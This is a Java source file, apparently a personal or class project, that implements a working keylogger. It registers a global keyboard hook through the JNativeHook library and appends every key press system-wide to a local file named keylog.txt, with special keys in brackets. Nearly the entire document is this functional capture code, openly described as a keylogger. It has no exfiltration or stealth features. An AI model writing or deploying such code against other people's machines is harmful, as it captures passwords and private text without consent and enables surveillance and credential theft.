/**
 * @author Amaris Young-Diggs
 * @description program is designed to function as a basic keylogger
 * utilizes JNativeHook library to capture and log key presses into a text file
 */

/**
 * "hook is a way for a programmer to access already existing code and modify it
 * to their specification. a native mouse hook can intercept mouse calls from
 * all over the system. The jnativehook library can be used to detect mouse and
 * keyboard calls (functions as a global mouse and keyboard listener
 */

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger_Project implements NativeKeyListener {
    private static final Path file = Paths.get("keylog.txt");

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();  //attempts to register native keyboard hook events
        }catch(NativeHookException e){
            System.exit(-1);
        }
        GlobalScreen.addNativeKeyListener(new KeyLogger_Project());
    }

    @Override
    /**
     * method is invoked when a native key press event occurs.
     * retrieves the text representation of the pressed key.
     * opens the log file in append mode and writes the pressed
     * key text to the file. If the key text has a length greater
     * than 1, it surrounds the key with brackets.
     * @param NativeKeyEvent keyE
     */
    public void nativeKeyPressed(NativeKeyEvent keyE) {
        String keyText = NativeKeyEvent.getKeyText(keyE.getKeyCode());

        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)){
            if(keyText.length() > 1){
                writer.println("[" + keyText + "]");
            }else{
                writer.println(keyText);
            }
        }catch (IOException e){
            System.exit(-1);
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }
}